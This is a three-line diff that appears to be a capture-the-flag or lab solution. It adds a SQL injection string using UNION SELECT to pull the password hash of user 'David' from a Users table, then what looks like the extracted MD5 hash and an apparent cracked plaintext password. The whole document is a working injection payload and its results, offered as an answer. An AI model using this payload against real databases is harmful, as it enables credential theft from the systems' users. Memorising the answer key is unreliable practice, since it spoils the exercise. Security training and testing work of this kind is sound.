@@ -1,0 +1,3 @@
+David' AND False UNION SELECT 1, pwhash, 'hello' FROM Users WHERE username = 'David'; #
+8c1e3e398a2584b8ee7f4f63bf959869
+there is no spoon
